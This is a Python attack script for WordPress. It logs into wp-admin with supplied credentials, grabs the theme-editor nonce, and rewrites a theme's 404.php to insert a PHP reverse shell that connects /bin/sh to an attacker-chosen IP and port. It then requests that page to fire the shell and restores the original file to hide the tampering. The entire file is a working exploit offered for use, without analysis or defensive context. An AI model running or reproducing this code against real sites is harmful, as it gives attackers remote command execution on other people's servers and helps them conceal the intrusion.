#version 2.0

import requests
import re
from html.parser import HTMLParser
from optparse import OptionParser


def WP_Login():
    data = {
            'log':options.user,
            'pwd':options.passwd,
            'wp-submit':'Log in'
            }
    r = s.post(options.target + '/wp-login.php', data=data, allow_redirects=False)
    r = s.get(options.target + '/wp-admin/theme-editor.php?file=404.php&theme=' + options.theme, cookies=s.cookies)
    nonce_value= re.search('name=\"nonce"\s+value=\"\w{10}"', r.text).group().split('\"')[3]
    return nonce_value

def Get_404():
    r = s.get(options.target + '/wp-admin/theme-editor.php?file=404.php&theme=' + options.theme, cookies=s.cookies)
    page_RE = re.compile("textarea(.|\n|\r)+?(?=\<\/textarea)", re.MULTILINE)
    h = HTMLParser()
    orig_page = h.unescape(re.search(page_RE, r.text).group().split('>')[1])
    with open("orig_404", "w") as f:
        f.write(orig_page)
        f.close()

def Create_Shell():
    with open("orig_404", "r") as f:
        orig_page = f.read()
        f.close()
    components = orig_page.split("<?php\n")
    components[1] = '$sock=fsockopen("' + options.rev_ip + '",' + options.rev_port + ');$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\n' + components[1]
    new_page = "<?php\n".join(components)
    with open("new_404", "w") as f:
        f.write(new_page)
        f.close()

def Load_Shell(nonce):
    with open("new_404", "r") as f:
        shell = f.read()
        f.close()
    data = {
            'nonce':nonce,
            'action':'edit-theme-plugin-file',
            'file':'404.php',
            'theme':options.theme,
            'newcontent':shell,
            }
    r = s.post(options.target + '/wp-admin/admin-ajax.php', cookies=s.cookies, data=data)

def Execute_Shell():
    requests.get(options.target + '/wp-content/themes/' + options.theme + '/404.php')

def Clean_Shell(nonce):
    with open("orig_404", "r") as f:
        no_shell = f.read()
        f.close()
    data = {
            'nonce':nonce,
            'action':'edit-theme-plugin-file',
            'file':'404.php',
            'theme':options.theme,
            'newcontent':no_shell,
            }
    r = s.post(options.target + '/wp-admin/admin-ajax.php', cookies=s.cookies, data=data)

parser = OptionParser()
parser.add_option("--target", help="URL for base wordpress install (ex: http://domain.com/wordpress)",dest="target")
parser.add_option("--theme", help="Wordpress theme to upload reverse shell to", dest="theme")
parser.add_option("--user", help="Username to authenticate with", dest="user")
parser.add_option("--pass", help="Password to authenticate with", dest="passwd")
parser.add_option("--revaddr", help="IP address for reverse shell to connect to", dest="rev_ip")
parser.add_option("--revport", help="Port for reverse shell to connect to", dest="rev_port")

(options, args) = parser.parse_args()

s = requests.session()
nonce = WP_Login()
Get_404()
Create_Shell()
Load_Shell(nonce)
Execute_Shell()
Clean_Shell(nonce)
